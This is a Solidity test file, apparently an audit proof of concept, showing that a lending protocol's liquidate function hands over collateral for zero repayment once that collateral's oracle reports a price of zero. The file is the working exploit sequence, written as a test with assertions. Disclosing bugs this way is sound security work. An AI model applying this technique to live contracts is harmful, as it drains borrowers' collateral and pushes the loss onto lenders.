// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {WAD, ORACLE_PRICE_SCALE, LLTV_0, LIQUIDATION_CURSOR_LOW} from "../../src/libraries/ConstantsLib.sol";
import {IMidnight, Market, CollateralParams} from "../../src/interfaces/IMidnight.sol";
import {UtilsLib} from "../../src/libraries/UtilsLib.sol";
import {Oracle} from "../helpers/Oracle.sol";
import {ERC20} from "../erc20s/ERC20.sol";
import {BaseTest} from "../BaseTest.sol";

/// @title Finding 1 PoC: `liquidate` seizes collateral for ZERO repayment on a price-0 collateral oracle.
/// @notice The seized-input branch derives
/// `repaidUnits = seizedAssets.mulDivUp(liquidatedCollatPrice, ORACLE_PRICE_SCALE).mulDivUp(WAD, lif)`.
/// When the liquidated collateral's oracle returns price == 0, `repaidUnits` collapses to 0, yet the
/// liquidator still receives `seizedAssets` of collateral and pays nothing. The mirror (repaid-input) branch
/// reverts on price 0 (division by zero) — only one direction is guarded.
contract LiquidateZeroPricePoC is BaseTest {
    using UtilsLib for uint256;

    Market internal market;
    bytes32 internal id;

    // Index of the collateral whose oracle stays priced (keeps the position from realizing bad debt).
    uint256 internal goodIdx;
    // Index of the collateral whose oracle is driven to 0 (the one seized for free).
    uint256 internal zeroIdx;
    Oracle internal zeroOracle;

    function setUp() public override {
        super.setUp();

        market.loanToken = address(loanToken);
        // Far maturity: we exercise the pre-maturity ("normal") liquidation mode.
        market.maturity = vm.getBlockTimestamp() + 365 days;
        market.collateralParams.push(
            CollateralParams({
                token: address(collateralToken1),
                lltv: LLTV_0, // 0.385e18
                maxLif: maxLif(LLTV_0, LIQUIDATION_CURSOR_LOW),
                oracle: address(oracle1)
            })
        );
        market.collateralParams.push(
            CollateralParams({
                token: address(collateralToken2),
                lltv: LLTV_0,
                maxLif: maxLif(LLTV_0, LIQUIDATION_CURSOR_LOW),
                oracle: address(oracle2)
            })
        );
        market.collateralParams = sortCollateralParams(market.collateralParams);
        market.rcfThreshold = 0;
        id = toId(market);

        // Identify which sorted index keeps a live price and which one we zero out.
        if (market.collateralParams[0].oracle == address(oracle1)) {
            goodIdx = 0;
            zeroIdx = 1;
        } else {
            goodIdx = 1;
            zeroIdx = 0;
        }
        zeroOracle = Oracle(market.collateralParams[zeroIdx].oracle);

        deal(address(loanToken), address(this), type(uint256).max);
    }

    function _supply(uint256 idx, uint256 amount) internal {
        address token = market.collateralParams[idx].token;
        deal(token, borrower, amount);
        vm.startPrank(borrower);
        ERC20(token).approve(address(midnight), amount);
        midnight.supplyCollateral(market, idx, amount, borrower);
        vm.stopPrank();
    }

    function testZeroPriceFreeSeizure() public {
        uint256 debt = 50e18;
        uint256 goodCollat = 100e18; // value 100 at price 1e36
        uint256 zeroCollat = 100e18; // value 100 at price 1e36 (until its oracle is zeroed)

        // Both oracles start at the default 1e36.
        _supply(goodIdx, goodCollat);
        _supply(zeroIdx, zeroCollat);

        // Borrow 50 against 200 of collateral value: healthy (maxDebt = 200 * 0.385 = 77 >= 50).
        setupMarket(market, debt);
        assertEq(midnight.debtOf(id, borrower), debt, "initial debt");
        assertTrue(midnight.isHealthy(market, id, borrower), "healthy before price drop");

        // The collateral's oracle returns 0 (dead feed / depegged or dead asset). It now contributes
        // nothing to maxDebt, so the position becomes liquidatable. Crucially it also contributes 0 to
        // badDebt, so the bad-debt branch does NOT run here — isolating the pure "free seizure" theft.
        zeroOracle.setPrice(0);
        assertFalse(midnight.isHealthy(market, id, borrower), "unhealthy after price drop");

        // Snapshot pre-liquidation state.
        uint256 liqCollatBefore = ERC20(market.collateralParams[zeroIdx].token).balanceOf(liquidator);
        uint256 liqLoanBefore = loanToken.balanceOf(liquidator);
        uint256 debtBefore = midnight.debtOf(id, borrower);
        uint256 totalUnitsBefore = midnight.totalUnits(id);
        uint128 lossFactorBefore = midnight.lossFactor(id);
        uint256 borrowerZeroCollatBefore = midnight.collateral(id, borrower, zeroIdx);

        // --- Contrast: the MIRROR (repaid-input) branch reverts on price 0 (division by zero). ---
        // This is the behaviour the protocol's LIVENESS docs explicitly acknowledge.
        vm.prank(liquidator);
        vm.expectRevert();
        midnight.liquidate(market, zeroIdx, 0, 1, borrower, false, liquidator, address(0), "");

        // --- Exploit: the seized-input branch SUCCEEDS and gives the collateral away for free. ---
        uint256 seize = zeroCollat; // seize all of the zero-priced collateral
        vm.prank(liquidator);
        (uint256 seizedAssets, uint256 repaidUnits) =
            midnight.liquidate(market, zeroIdx, seize, 0, borrower, false, liquidator, address(0), "");

        // The liquidator paid ZERO loan tokens but walked away with the full seized collateral.
        assertEq(repaidUnits, 0, "repaidUnits collapsed to zero");
        assertEq(seizedAssets, seize, "full seizure");
        assertEq(loanToken.balanceOf(liquidator), liqLoanBefore, "liquidator paid nothing");
        assertEq(
            ERC20(market.collateralParams[zeroIdx].token).balanceOf(liquidator),
            liqCollatBefore + seize,
            "liquidator received free collateral"
        );

        // The borrower's debt is UNCHANGED: lenders silently absorb the un-reduced debt.
        assertEq(midnight.debtOf(id, borrower), debtBefore, "borrower debt unchanged");
        assertEq(midnight.totalUnits(id), totalUnitsBefore, "no bad debt realized");
        assertEq(midnight.lossFactor(id), lossFactorBefore, "loss factor unchanged");

        // Collateral was drained from the borrower for nothing.
        assertEq(
            midnight.collateral(id, borrower, zeroIdx),
            borrowerZeroCollatBefore - seize,
            "collateral seized for free"
        );

        emit log_named_uint("seizedAssets (collateral taken)", seizedAssets);
        emit log_named_uint("repaidUnits (loan tokens paid)", repaidUnits);
        emit log_named_uint("borrower debt before", debtBefore);
        emit log_named_uint("borrower debt after ", midnight.debtOf(id, borrower));
    }
}
